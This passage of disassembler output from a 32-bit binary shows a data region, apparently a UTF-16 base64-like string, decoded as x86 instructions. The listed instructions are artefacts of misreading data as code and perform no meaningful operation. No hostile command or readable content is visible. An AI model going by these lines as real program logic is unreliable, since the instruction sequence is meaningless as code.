  40a66f:	00 64 00 46          	add    %ah,0x46(%eax,%eax,1)
  40a673:	00 2b                	add    %ch,(%ebx)
  40a675:	00 39                	add    %bh,(%ecx)
  40a677:	00 77 00             	add    %dh,0x0(%edi)
  40a67a:	47                   	inc    %edi
  40a67b:	00 6d 00             	add    %ch,0x0(%ebp)
  40a67e:	56                   	push   %esi
  40a67f:	00 70 00             	add    %dh,0x0(%eax)
  40a682:	75 00                	jne    0x40a684
  40a684:	69 00 59 00 48 00    	imul   $0x480059,(%eax),%eax
  40a68a:	66 00 52 00          	data16 add %dl,0x0(%edx)
  40a68e:	57                   	push   %edi
  40a68f:	00 43 00             	add    %al,0x0(%ebx)
  40a692:	4f                   	dec    %edi
  40a693:	00 62 00             	add    %ah,0x0(%edx)
  40a696:	74 00                	je     0x40a698
  40a698:	55                   	push   %ebp
  40a699:	00 74 00 57          	add    %dh,0x57(%eax,%eax,1)
  40a69d:	00 79 00             	add    %bh,0x0(%ecx)
  40a6a0:	7a 00                	jp     0x40a6a2
  40a6a2:	30 00                	xor    %al,(%eax)
  40a6a4:	73 00                	jae    0x40a6a6
  40a6a6:	43                   	inc    %ebx
  40a6a7:	00 67 00             	add    %ah,0x0(%edi)
  40a6aa:	52                   	push   %edx
  40a6ab:	00 44 00 78          	add    %al,0x78(%eax,%eax,1)
  40a6af:	00 4c 00 68          	add    %cl,0x68(%eax,%eax,1)
  40a6b3:	00 33                	add    %dh,(%ebx)
  40a6b5:	00 31                	add    %dh,(%ecx)
  40a6b7:	00 4c 00 57          	add    %cl,0x57(%eax,%eax,1)
  40a6bb:	00 66 00             	add    %ah,0x0(%esi)
  40a6be:	76 00                	jbe    0x40a6c0
  40a6c0:	6f                   	outsl  %ds:(%esi),(%dx)
  40a6c1:	00 70 00             	add    %dh,0x0(%eax)
  40a6c4:	4b                   	dec    %ebx
  40a6c5:	00 48 00             	add    %cl,0x0(%eax)
  40a6c8:	2f                   	das
  40a6c9:	00 46 00             	add    %al,0x0(%esi)
  40a6cc:	54                   	push   %esp
  40a6cd:	00 69 00             	add    %ch,0x0(%ecx)
  40a6d0:	39 00                	cmp    %eax,(%eax)
  40a6d2:	30 00                	xor    %al,(%eax)
  40a6d4:	34 00                	xor    $0x0,%al
  40a6d6:	56                   	push   %esi
  40a6d7:	00 31                	add    %dh,(%ecx)
  40a6d9:	00 37                	add    %dh,(%edi)
  40a6db:	00 6e 00             	add    %ch,0x0(%esi)
  40a6de:	70 00                	jo     0x40a6e0
  40a6e0:	70 00                	jo     0x40a6e2
  40a6e2:	79 00                	jns    0x40a6e4
  40a6e4:	32 00                	xor    (%eax),%al
  40a6e6:	41                   	inc    %ecx
  40a6e7:	00 31                	add    %dh,(%ecx)
  40a6e9:	00 50 00             	add    %dl,0x0(%eax)
  40a6ec:	58                   	pop    %eax
  40a6ed:	00 49 00             	add    %cl,0x0(%ecx)
  40a6f0:	4d                   	dec    %ebp
  40a6f1:	00 6a 00             	add    %ch,0x0(%edx)
  40a6f4:	70 00                	jo     0x40a6f6
  40a6f6:	39 00                	cmp    %eax,(%eax)
  40a6f8:	4f                   	dec    %edi
  40a6f9:	00 31                	add    %dh,(%ecx)
  40a6fb:	00 42 00             	add    %al,0x0(%edx)
  40a6fe:	4f                   	dec    %edi
  40a6ff:	00 62 00             	add    %ah,0x0(%edx)
  40a702:	41                   	inc    %ecx
  40a703:	00 65 00             	add    %ah,0x0(%ebp)
  40a706:	46                   	inc    %esi
  40a707:	00 59 00             	add    %bl,0x0(%ecx)
  40a70a:	49                   	dec    %ecx
  40a70b:	00 32                	add    %dh,(%edx)
  40a70d:	00 59 00             	add    %bl,0x0(%ecx)
  40a710:	69 00 47 00 31 00    	imul   $0x310047,(%eax),%eax
  40a716:	62 00                	bound  %eax,(%eax)
  40a718:	49                   	dec    %ecx
  40a719:	00 54 00 4c          	add    %dl,0x4c(%eax,%eax,1)
  40a71d:	00 37                	add    %dh,(%edi)
  40a71f:	00 4b 00             	add    %cl,0x0(%ebx)
  40a722:	61                   	popa
  40a723:	00 57 00             	add    %dl,0x0(%edi)
  40a726:	35 00 4c 00 67       	xor    $0x67004c00,%eax
  40a72b:	00 6d 00             	add    %ch,0x0(%ebp)
  40a72e:	68 00 6a 00 46       	push   $0x46006a00
  40a733:	00 79 00             	add    %bh,0x0(%ecx)
  40a736:	6c                   	insb   (%dx),%es:(%edi)
  40a737:	00 73 00             	add    %dh,0x0(%ebx)
  40a73a:	39 00                	cmp    %eax,(%eax)
  40a73c:	45                   	inc    %ebp
  40a73d:	00 2f                	add    %ch,(%edi)
  40a73f:	00 48 00             	add    %cl,0x0(%eax)
  40a742:	41                   	inc    %ecx
  40a743:	00 71 00             	add    %dh,0x0(%ecx)
  40a746:	39 00                	cmp    %eax,(%eax)
  40a748:	76 00                	jbe    0x40a74a
  40a74a:	69 00 70 00 75 00    	imul   $0x750070,(%eax),%eax
  40a750:	33 00                	xor    (%eax),%eax
  40a752:	79 00                	jns    0x40a754
  40a754:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40a758:	5a                   	pop    %edx
  40a759:	00 75 00             	add    %dh,0x0(%ebp)
  40a75c:	53                   	push   %ebx
  40a75d:	00 79 00             	add    %bh,0x0(%ecx)
  40a760:	6a 00                	push   $0x0
  40a762:	46                   	inc    %esi
  40a763:	00 33                	add    %dh,(%ebx)
  40a765:	00 69 00             	add    %ch,0x0(%ecx)
  40a768:	63 00                	arpl   %eax,(%eax)
  40a76a:	30 00                	xor    %al,(%eax)
  40a76c:	66 00 6b 00          	data16 add %ch,0x0(%ebx)
  40a770:	38 00                	cmp    %al,(%eax)
  40a772:	62 00                	bound  %eax,(%eax)
  40a774:	79 00                	jns    0x40a776
  40a776:	79 00                	jns    0x40a778
  40a778:	4d                   	dec    %ebp
  40a779:	00 58 00             	add    %bl,0x0(%eax)
  40a77c:	4e                   	dec    %esi
  40a77d:	00 66 00             	add    %ah,0x0(%esi)
  40a780:	45                   	inc    %ebp
  40a781:	00 35 00 7a 00 65    	add    %dh,0x65007a00
  40a787:	00 2b                	add    %ch,(%ebx)
  40a789:	00 37                	add    %dh,(%edi)
  40a78b:	00 4a 00             	add    %cl,0x0(%edx)
  40a78e:	6b 00 7a             	imul   $0x7a,(%eax),%eax
  40a791:	00 68 00             	add    %ch,0x0(%eax)
  40a794:	34 00                	xor    $0x0,%al
  40a796:	62 00                	bound  %eax,(%eax)
  40a798:	77 00                	ja     0x40a79a
  40a79a:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40a79e:	76 00                	jbe    0x40a7a0
  40a7a0:	57                   	push   %edi
  40a7a1:	00 57 00             	add    %dl,0x0(%edi)
  40a7a4:	47                   	inc    %edi
  40a7a5:	00 49 00             	add    %cl,0x0(%ecx)
  40a7a8:	4c                   	dec    %esp
  40a7a9:	00 43 00             	add    %al,0x0(%ebx)
  40a7ac:	57                   	push   %edi
  40a7ad:	00 7a 00             	add    %bh,0x0(%edx)
  40a7b0:	46                   	inc    %esi
  40a7b1:	00 56 00             	add    %dl,0x0(%esi)
  40a7b4:	55                   	push   %ebp
  40a7b5:	00 73 00             	add    %dh,0x0(%ebx)
  40a7b8:	42                   	inc    %edx
  40a7b9:	00 45 00             	add    %al,0x0(%ebp)
  40a7bc:	45                   	inc    %ebp
  40a7bd:	00 39                	add    %bh,(%ecx)
  40a7bf:	00 66 00             	add    %ah,0x0(%esi)
  40a7c2:	55                   	push   %ebp
  40a7c3:	00 36                	add    %dh,(%esi)
  40a7c5:	00 79 00             	add    %bh,0x0(%ecx)
  40a7c8:	38 00                	cmp    %al,(%eax)
  40a7ca:	62 00                	bound  %eax,(%eax)
  40a7cc:	4a                   	dec    %edx
  40a7cd:	00 71 00             	add    %dh,0x0(%ecx)
  40a7d0:	6f                   	outsl  %ds:(%esi),(%dx)
  40a7d1:	00 37                	add    %dh,(%edi)
  40a7d3:	00 72 00             	add    %dh,0x0(%edx)
  40a7d6:	55                   	push   %ebp
  40a7d7:	00 61 00             	add    %ah,0x0(%ecx)
  40a7da:	34 00                	xor    $0x0,%al
  40a7dc:	52                   	push   %edx
  40a7dd:	00 58 00             	add    %bl,0x0(%eax)
  40a7e0:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
  40a7e4:	63 00                	arpl   %eax,(%eax)
  40a7e6:	38 00                	cmp    %al,(%eax)
  40a7e8:	2b 00                	sub    (%eax),%eax
  40a7ea:	61                   	popa
  40a7eb:	00 63 00             	add    %ah,0x0(%ebx)
  40a7ee:	54                   	push   %esp
  40a7ef:	00 7a 00             	add    %bh,0x0(%edx)
  40a7f2:	46                   	inc    %esi
  40a7f3:	00 69 00             	add    %ch,0x0(%ecx)
  40a7f6:	2f                   	das
  40a7f7:	00 43 00             	add    %al,0x0(%ebx)
  40a7fa:	68 00 59 00 32       	push   $0x32005900
  40a7ff:	00 74 00 47          	add    %dh,0x47(%eax,%eax,1)
  40a803:	00 5a 00             	add    %bl,0x0(%edx)
  40a806:	79 00                	jns    0x40a808
  40a808:	49                   	dec    %ecx
  40a809:	00 6f 00             	add    %ch,0x0(%edi)
  40a80c:	2f                   	das
  40a80d:	00 66 00             	add    %ah,0x0(%esi)
  40a810:	30 00                	xor    %al,(%eax)
  40a812:	53                   	push   %ebx
  40a813:	00 71 00             	add    %dh,0x0(%ecx)
  40a816:	64 00 63 00          	add    %ah,%fs:0x0(%ebx)
  40a81a:	49                   	dec    %ecx
  40a81b:	00 6d 00             	add    %ch,0x0(%ebp)
  40a81e:	44                   	inc    %esp
  40a81f:	00 42 00             	add    %al,0x0(%edx)
  40a822:	41                   	inc    %ecx
  40a823:	00 6d 00             	add    %ch,0x0(%ebp)
  40a826:	70 00                	jo     0x40a828
  40a828:	73 00                	jae    0x40a82a
  40a82a:	39 00                	cmp    %eax,(%eax)
  40a82c:	4e                   	dec    %esi
  40a82d:	00 33                	add    %dh,(%ebx)
  40a82f:	00 57 00             	add    %dl,0x0(%edi)
  40a832:	70 00                	jo     0x40a834
  40a834:	6f                   	outsl  %ds:(%esi),(%dx)
  40a835:	00 76 00             	add    %dh,0x0(%esi)
  40a838:	6b 00 48             	imul   $0x48,(%eax),%eax
  40a83b:	00 43 00             	add    %al,0x0(%ebx)
  40a83e:	79 00                	jns    0x40a840
  40a840:	4c                   	dec    %esp
  40a841:	00 38                	add    %bh,(%eax)
  40a843:	00 42 00             	add    %al,0x0(%edx)
  40a846:	36 00 71 00          	add    %dh,%ss:0x0(%ecx)
  40a84a:	49                   	dec    %ecx
  40a84b:	00 45 00             	add    %al,0x0(%ebp)
  40a84e:	34 00                	xor    $0x0,%al
  40a850:	38 00                	cmp    %al,(%eax)
  40a852:	79 00                	jns    0x40a854
  40a854:	5a                   	pop    %edx
  40a855:	00 44 00 2b          	add    %al,0x2b(%eax,%eax,1)
  40a859:	00 2b                	add    %ch,(%ebx)
  40a85b:	00 38                	add    %bh,(%eax)
  40a85d:	00 6a 00             	add    %ch,0x0(%edx)
  40a860:	4a                   	dec    %edx
  40a861:	00 73 00             	add    %dh,0x0(%ebx)
  40a864:	6f                   	outsl  %ds:(%esi),(%dx)
  40a865:	00 64 00 71          	add    %ah,0x71(%eax,%eax,1)
  40a869:	00 7a 00             	add    %bh,0x0(%edx)
  40a86c:	73 00                	jae    0x40a86e
  40a86e:	46                   	inc    %esi
  40a86f:	00 36                	add    %dh,(%esi)
  40a871:	00 47 00             	add    %al,0x0(%edi)
  40a874:	4f                   	dec    %edi
  40a875:	00 62 00             	add    %ah,0x0(%edx)
  40a878:	71 00                	jno    0x40a87a
  40a87a:	6a 00                	push   $0x0
  40a87c:	32 00                	xor    (%eax),%al
  40a87e:	32 00                	xor    (%eax),%al
  40a880:	50                   	push   %eax
  40a881:	00 76 00             	add    %dh,0x0(%esi)
  40a884:	46                   	inc    %esi
  40a885:	00 30                	add    %dh,(%eax)
  40a887:	00 48 00             	add    %cl,0x0(%eax)
  40a88a:	38 00                	cmp    %al,(%eax)
  40a88c:	56                   	push   %esi
  40a88d:	00 70 00             	add    %dh,0x0(%eax)
  40a890:	4c                   	dec    %esp
  40a891:	00 73 00             	add    %dh,0x0(%ebx)
  40a894:	32 00                	xor    (%eax),%al
  40a896:	76 00                	jbe    0x40a898
  40a898:	73 00                	jae    0x40a89a
  40a89a:	72 00                	jb     0x40a89c
  40a89c:	7a 00                	jp     0x40a89e
  40a89e:	7a 00                	jp     0x40a8a0
  40a8a0:	57                   	push   %edi
  40a8a1:	00 6f 00             	add    %ch,0x0(%edi)
  40a8a4:	75 00                	jne    0x40a8a6
  40a8a6:	6e                   	outsb  %ds:(%esi),(%dx)
  40a8a7:	00 46 00             	add    %al,0x0(%esi)
  40a8aa:	38 00                	cmp    %al,(%eax)
  40a8ac:	70 00                	jo     0x40a8ae
  40a8ae:	66 00 46 00          	data16 add %al,0x0(%esi)
  40a8b2:	73 00                	jae    0x40a8b4
  40a8b4:	43                   	inc    %ebx
  40a8b5:	00 2b                	add    %ch,(%ebx)
  40a8b7:	00 63 00             	add    %ah,0x0(%ebx)
  40a8ba:	69 00 6c 00 6e 00    	imul   $0x6e006c,(%eax),%eax
  40a8c0:	4f                   	dec    %edi
  40a8c1:	00 4d 00             	add    %cl,0x0(%ebp)
  40a8c4:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40a8c8:	36 00 31             	add    %dh,%ss:(%ecx)
  40a8cb:	00 44 00 54          	add    %al,0x54(%eax,%eax,1)
  40a8cf:	00 4f 00             	add    %cl,0x0(%edi)
  40a8d2:	6f                   	outsl  %ds:(%esi),(%dx)
  40a8d3:	00 42 00             	add    %al,0x0(%edx)
  40a8d6:	72 00                	jb     0x40a8d8
  40a8d8:	6b 00 79             	imul   $0x79,(%eax),%eax
  40a8db:	00 35 00 66 00 4e    	add    %dh,0x4e006600
  40a8e1:	00 54 00 62          	add    %dl,0x62(%eax,%eax,1)
  40a8e5:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40a8e9:	00 38                	add    %bh,(%eax)
  40a8eb:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40a8ef:	00 56 00             	add    %dl,0x0(%esi)
  40a8f2:	56                   	push   %esi
  40a8f3:	00 47 00             	add    %al,0x0(%edi)
  40a8f6:	5a                   	pop    %edx
  40a8f7:	00 42 00             	add    %al,0x0(%edx)
  40a8fa:	59                   	pop    %ecx
  40a8fb:	00 4f 00             	add    %cl,0x0(%edi)
  40a8fe:	55                   	push   %ebp
  40a8ff:	00 58 00             	add    %bl,0x0(%eax)
  40a902:	78 00                	js     0x40a904
  40a904:	70 00                	jo     0x40a906
  40a906:	4b                   	dec    %ebx
  40a907:	00 63 00             	add    %ah,0x0(%ebx)
  40a90a:	77 00                	ja     0x40a90c
  40a90c:	44                   	inc    %esp
  40a90d:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a910:	74 00                	je     0x40a912
  40a912:	4f                   	dec    %edi
  40a913:	00 36                	add    %dh,(%esi)
  40a915:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a918:	34 00                	xor    $0x0,%al
  40a91a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a91b:	00 48 00             	add    %cl,0x0(%eax)
  40a91e:	5a                   	pop    %edx
  40a91f:	00 33                	add    %dh,(%ebx)
  40a921:	00 6b 00             	add    %ch,0x0(%ebx)
  40a924:	48                   	dec    %eax
  40a925:	00 4e 00             	add    %cl,0x0(%esi)
  40a928:	6d                   	insl   (%dx),%es:(%edi)
  40a929:	00 6e 00             	add    %ch,0x0(%esi)
  40a92c:	4a                   	dec    %edx
  40a92d:	00 63 00             	add    %ah,0x0(%ebx)
  40a930:	6f                   	outsl  %ds:(%esi),(%dx)
  40a931:	00 4d 00             	add    %cl,0x0(%ebp)
  40a934:	55                   	push   %ebp
  40a935:	00 55 00             	add    %dl,0x0(%ebp)
  40a938:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  40a93c:	6a 00                	push   $0x0
  40a93e:	37                   	aaa
  40a93f:	00 39                	add    %bh,(%ecx)
  40a941:	00 54 00 76          	add    %dl,0x76(%eax,%eax,1)
  40a945:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a948:	45                   	inc    %ebp
  40a949:	00 62 00             	add    %ah,0x0(%edx)
  40a94c:	53                   	push   %ebx
  40a94d:	00 70 00             	add    %dh,0x0(%eax)
  40a950:	43                   	inc    %ebx
  40a951:	00 70 00             	add    %dh,0x0(%eax)
  40a954:	4a                   	dec    %edx
  40a955:	00 61 00             	add    %ah,0x0(%ecx)
  40a958:	2f                   	das
  40a959:	00 55 00             	add    %dl,0x0(%ebp)
  40a95c:	69 00 31 00 69 00    	imul   $0x690031,(%eax),%eax
  40a962:	63 00                	arpl   %eax,(%eax)
  40a964:	35 00 7a 00 6a       	xor    $0x6a007a00,%eax
  40a969:	00 39                	add    %bh,(%ecx)
  40a96b:	00 36                	add    %dh,(%esi)
  40a96d:	00 52 00             	add    %dl,0x0(%edx)
  40a970:	49                   	dec    %ecx
  40a971:	00 57 00             	add    %dl,0x0(%edi)
  40a974:	67 00 32             	add    %dh,(%bp,%si)
  40a977:	00 4c 00 33          	add    %cl,0x33(%eax,%eax,1)
  40a97b:	00 4a 00             	add    %cl,0x0(%edx)
  40a97e:	47                   	inc    %edi
  40a97f:	00 46 00             	add    %al,0x0(%esi)
  40a982:	69 00 2b 00 41 00    	imul   $0x41002b,(%eax),%eax
  40a988:	52                   	push   %edx
  40a989:	00 4a 00             	add    %cl,0x0(%edx)
  40a98c:	55                   	push   %ebp
  40a98d:	00 59 00             	add    %bl,0x0(%ecx)
  40a990:	59                   	pop    %ecx
  40a991:	00 71 00             	add    %dh,0x0(%ecx)
  40a994:	41                   	inc    %ecx
  40a995:	00 52 00             	add    %dl,0x0(%edx)
  40a998:	73 00                	jae    0x40a99a
  40a99a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a99b:	00 69 00             	add    %ch,0x0(%ecx)
  40a99e:	47                   	inc    %edi
  40a99f:	00 69 00             	add    %ch,0x0(%ecx)
  40a9a2:	55                   	push   %ebp
  40a9a3:	00 4a 00             	add    %cl,0x0(%edx)
  40a9a6:	6e                   	outsb  %ds:(%esi),(%dx)
  40a9a7:	00 6d 00             	add    %ch,0x0(%ebp)
  40a9aa:	6d                   	insl   (%dx),%es:(%edi)
  40a9ab:	00 64 00 5a          	add    %ah,0x5a(%eax,%eax,1)
  40a9af:	00 77 00             	add    %dh,0x0(%edi)
  40a9b2:	4d                   	dec    %ebp
  40a9b3:	00 79 00             	add    %bh,0x0(%ecx)
  40a9b6:	2b 00                	sub    (%eax),%eax
  40a9b8:	4b                   	dec    %ebx
  40a9b9:	00 30                	add    %dh,(%eax)
  40a9bb:	00 46 00             	add    %al,0x0(%esi)
  40a9be:	37                   	aaa
  40a9bf:	00 39                	add    %bh,(%ecx)
  40a9c1:	00 76 00             	add    %dh,0x0(%esi)
  40a9c4:	6c                   	insb   (%dx),%es:(%edi)
  40a9c5:	00 52 00             	add    %dl,0x0(%edx)
  40a9c8:	44                   	inc    %esp
  40a9c9:	00 65 00             	add    %ah,0x0(%ebp)
  40a9cc:	62 00                	bound  %eax,(%eax)
  40a9ce:	45                   	inc    %ebp
  40a9cf:	00 51 00             	add    %dl,0x0(%ecx)
  40a9d2:	65 00 4d 00          	add    %cl,%gs:0x0(%ebp)
  40a9d6:	66 00 46 00          	data16 add %al,0x0(%esi)
  40a9da:	43                   	inc    %ebx
  40a9db:	00 32                	add    %dh,(%edx)
  40a9dd:	00 35 00 6e 00 31    	add    %dh,0x31006e00
  40a9e3:	00 74 00 2f          	add    %dh,0x2f(%eax,%eax,1)
  40a9e7:	00 2b                	add    %ch,(%ebx)
  40a9e9:	00 30                	add    %dh,(%eax)
  40a9eb:	00 58 00             	add    %bl,0x0(%eax)
  40a9ee:	54                   	push   %esp
  40a9ef:	00 50 00             	add    %dl,0x0(%eax)
  40a9f2:	69 00 49 00 4f 00    	imul   $0x4f0049,(%eax),%eax
  40a9f8:	67 00 53 00          	add    %dl,0x0(%bp,%di)
  40a9fc:	44                   	inc    %esp
  40a9fd:	00 49 00             	add    %cl,0x0(%ecx)
  40aa00:	50                   	push   %eax
  40aa01:	00 71 00             	add    %dh,0x0(%ecx)
  40aa04:	74 00                	je     0x40aa06
  40aa06:	76 00                	jbe    0x40aa08
  40aa08:	46                   	inc    %esi
  40aa09:	00 33                	add    %dh,(%ebx)
  40aa0b:	00 55 00             	add    %dl,0x0(%ebp)
  40aa0e:	47                   	inc    %edi
  40aa0f:	00 69 00             	add    %ch,0x0(%ecx)
  40aa12:	46                   	inc    %esi
  40aa13:	00 6b 00             	add    %ch,0x0(%ebx)
  40aa16:	4d                   	dec    %ebp
  40aa17:	00 4d 00             	add    %cl,0x0(%ebp)
  40aa1a:	6a 00                	push   $0x0
  40aa1c:	4e                   	dec    %esi
  40aa1d:	00 6c 00 63          	add    %ch,0x63(%eax,%eax,1)
  40aa21:	00 59 00             	add    %bl,0x0(%ecx)
  40aa24:	2f                   	das
  40aa25:	00 77 00             	add    %dh,0x0(%edi)
  40aa28:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  40aa2c:	44                   	inc    %esp
  40aa2d:	00 47 00             	add    %al,0x0(%edi)
  40aa30:	7a 00                	jp     0x40aa32
  40aa32:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa33:	00 4c 00 43          	add    %cl,0x43(%eax,%eax,1)
  40aa37:	00 51 00             	add    %dl,0x0(%ecx)
  40aa3a:	33 00                	xor    (%eax),%eax
  40aa3c:	58                   	pop    %eax
  40aa3d:	00 2b                	add    %ch,(%ebx)
  40aa3f:	00 59 00             	add    %bl,0x0(%ecx)
  40aa42:	76 00                	jbe    0x40aa44
  40aa44:	62 00                	bound  %eax,(%eax)
  40aa46:	56                   	push   %esi
  40aa47:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aa4a:	4f                   	dec    %edi
  40aa4b:	00 54 00 62          	add    %dl,0x62(%eax,%eax,1)
  40aa4f:	00 74 00 45          	add    %dh,0x45(%eax,%eax,1)
  40aa53:	00 5a 00             	add    %bl,0x0(%edx)
  40aa56:	4a                   	dec    %edx
  40aa57:	00 50 00             	add    %dl,0x0(%eax)
  40aa5a:	2f                   	das
  40aa5b:	00 4e 00             	add    %cl,0x0(%esi)
  40aa5e:	59                   	pop    %ecx
  40aa5f:	00 4b 00             	add    %cl,0x0(%ebx)
  40aa62:	57                   	push   %edi
  40aa63:	00 49 00             	add    %cl,0x0(%ecx)
  40aa66:	4e                   	dec    %esi
  40aa67:	00 75 00             	add    %dh,0x0(%ebp)
  40aa6a:	55                   	push   %ebp
  40aa6b:	00 62 00             	add    %ah,0x0(%edx)
  40aa6e:	52                   	push   %edx
  40aa6f:	00 6d 00             	add    %ch,0x0(%ebp)
  40aa72:	4f                   	dec    %edi
  40aa73:	00 49 00             	add    %cl,0x0(%ecx)
  40aa76:	5a                   	pop    %edx
  40aa77:	00 55 00             	add    %dl,0x0(%ebp)
  40aa7a:	58                   	pop    %eax
  40aa7b:	00 6c 00 39          	add    %ch,0x39(%eax,%eax,1)
  40aa7f:	00 42 00             	add    %al,0x0(%edx)
  40aa82:	55                   	push   %ebp
  40aa83:	00 77 00             	add    %dh,0x0(%edi)
  40aa86:	65 00 6f 00          	add    %ch,%gs:0x0(%edi)
  40aa8a:	7a 00                	jp     0x40aa8c
  40aa8c:	71 00                	jno    0x40aa8e
  40aa8e:	49                   	dec    %ecx
  40aa8f:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40aa93:	00 51 00             	add    %dl,0x0(%ecx)
  40aa96:	4b                   	dec    %ebx
  40aa97:	00 47 00             	add    %al,0x0(%edi)
  40aa9a:	75 00                	jne    0x40aa9c
  40aa9c:	78 00                	js     0x40aa9e
  40aa9e:	64 00 5a 00          	add    %bl,%fs:0x0(%edx)
  40aaa2:	2f                   	das
  40aaa3:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aaa6:	44                   	inc    %esp
  40aaa7:	00 44 00 45          	add    %al,0x45(%eax,%eax,1)
  40aaab:	00 71 00             	add    %dh,0x0(%ecx)
  40aaae:	46                   	inc    %esi
  40aaaf:	00 2b                	add    %ch,(%ebx)
  40aab1:	00 77 00             	add    %dh,0x0(%edi)
  40aab4:	74 00                	je     0x40aab6
  40aab6:	54                   	push   %esp
  40aab7:	00 6b 00             	add    %ch,0x0(%ebx)
  40aaba:	61                   	popa
  40aabb:	00 50 00             	add    %dl,0x0(%eax)
  40aabe:	77 00                	ja     0x40aac0
  40aac0:	57                   	push   %edi
  40aac1:	00 4f 00             	add    %cl,0x0(%edi)
  40aac4:	79 00                	jns    0x40aac6
  40aac6:	47                   	inc    %edi
  40aac7:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  40aacb:	00 59 00             	add    %bl,0x0(%ecx)
  40aace:	75 00                	jne    0x40aad0
  40aad0:	70 00                	jo     0x40aad2
  40aad2:	61                   	popa
  40aad3:	00 78 00             	add    %bh,0x0(%eax)
  40aad6:	34 00                	xor    $0x0,%al
  40aad8:	53                   	push   %ebx
  40aad9:	00 45 00             	add    %al,0x0(%ebp)
  40aadc:	69 00 72 00 4c 00    	imul   $0x4c0072,(%eax),%eax
  40aae2:	65 00 2f             	add    %ch,%gs:(%edi)
  40aae5:	00 2f                	add    %ch,(%edi)
  40aae7:	00 54 00 2b          	add    %dl,0x2b(%eax,%eax,1)
  40aaeb:	00 79 00             	add    %bh,0x0(%ecx)
  40aaee:	4b                   	dec    %ebx
  40aaef:	00 4c 00 5a          	add    %cl,0x5a(%eax,%eax,1)
  40aaf3:	00 43 00             	add    %al,0x0(%ebx)
  40aaf6:	4c                   	dec    %esp
  40aaf7:	00 36                	add    %dh,(%esi)
  40aaf9:	00 76 00             	add    %dh,0x0(%esi)
  40aafc:	77 00                	ja     0x40aafe
  40aafe:	50                   	push   %eax
  40aaff:	00 30                	add    %dh,(%eax)
  40ab01:	00 6d 00             	add    %ch,0x0(%ebp)
  40ab04:	59                   	pop    %ecx
  40ab05:	00 52 00             	add    %dl,0x0(%edx)
  40ab08:	44                   	inc    %esp
  40ab09:	00 49 00             	add    %cl,0x0(%ecx)
  40ab0c:	54                   	push   %esp
  40ab0d:	00 6b 00             	add    %ch,0x0(%ebx)
  40ab10:	49                   	dec    %ecx
  40ab11:	00 37                	add    %dh,(%edi)
  40ab13:	00 62 00             	add    %ah,0x0(%edx)
  40ab16:	78 00                	js     0x40ab18
  40ab18:	62 00                	bound  %eax,(%eax)
  40ab1a:	4e                   	dec    %esi
  40ab1b:	00 50 00             	add    %dl,0x0(%eax)
  40ab1e:	4d                   	dec    %ebp
  40ab1f:	00 2b                	add    %ch,(%ebx)
  40ab21:	00 32                	add    %dh,(%edx)
  40ab23:	00 73 00             	add    %dh,0x0(%ebx)
  40ab26:	5a                   	pop    %edx
  40ab27:	00 63 00             	add    %ah,0x0(%ebx)
  40ab2a:	45                   	inc    %ebp
  40ab2b:	00 4d 00             	add    %cl,0x0(%ebp)
  40ab2e:	33 00                	xor    (%eax),%eax
  40ab30:	57                   	push   %edi
  40ab31:	00 51 00             	add    %dl,0x0(%ecx)
  40ab34:	72 00                	jb     0x40ab36
  40ab36:	4d                   	dec    %ebp
  40ab37:	00 42 00             	add    %al,0x0(%edx)
  40ab3a:	2f                   	das
  40ab3b:	00 66 00             	add    %ah,0x0(%esi)
  40ab3e:	53                   	push   %ebx
  40ab3f:	00 73 00             	add    %dh,0x0(%ebx)
  40ab42:	46                   	inc    %esi
  40ab43:	00 36                	add    %dh,(%esi)
  40ab45:	00 57 00             	add    %dl,0x0(%edi)
  40ab48:	34 00                	xor    $0x0,%al
  40ab4a:	53                   	push   %ebx
  40ab4b:	00 6d 00             	add    %ch,0x0(%ebp)
  40ab4e:	48                   	dec    %eax
  40ab4f:	00 75 00             	add    %dh,0x0(%ebp)
  40ab52:	30 00                	xor    %al,(%eax)
  40ab54:	68 00 4e 00 64       	push   $0x64004e00
  40ab59:	00 67 00             	add    %ah,0x0(%edi)
  40ab5c:	53                   	push   %ebx
  40ab5d:	00 56 00             	add    %dl,0x0(%esi)
  40ab60:	36 00 6a 00          	add    %ch,%ss:0x0(%edx)
  40ab64:	56                   	push   %esi
  40ab65:	00 2f                	add    %ch,(%edi)
  40ab67:	00 38                	add    %bh,(%eax)
  40ab69:	00 6e 00             	add    %ch,0x0(%esi)
  40ab6c:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab6d:	00 6f 00             	add    %ch,0x0(%edi)
  40ab70:	55                   	push   %ebp
  40ab71:	00 35 00 41 00 43    	add    %dh,0x43004100
  40ab77:	00 48 00             	add    %cl,0x0(%eax)
  40ab7a:	68 00 33 00 6a       	push   $0x6a003300
  40ab7f:	00 66 00             	add    %ah,0x0(%esi)
  40ab82:	42                   	inc    %edx
  40ab83:	00 6b 00             	add    %ch,0x0(%ebx)
  40ab86:	49                   	dec    %ecx
  40ab87:	00 32                	add    %dh,(%edx)
  40ab89:	00 6f 00             	add    %ch,0x0(%edi)
  40ab8c:	34 00                	xor    $0x0,%al
  40ab8e:	4b                   	dec    %ebx
  40ab8f:	00 59 00             	add    %bl,0x0(%ecx)
  40ab92:	67 00 74 00          	add    %dh,0x0(%si)
  40ab96:	47                   	inc    %edi
  40ab97:	00 73 00             	add    %dh,0x0(%ebx)
  40ab9a:	61                   	popa
  40ab9b:	00 63 00             	add    %ah,0x0(%ebx)
  40ab9e:	50                   	push   %eax
  40ab9f:	00 38                	add    %bh,(%eax)
  40aba1:	00 42 00             	add    %al,0x0(%edx)
  40aba4:	76 00                	jbe    0x40aba6
  40aba6:	51                   	push   %ecx
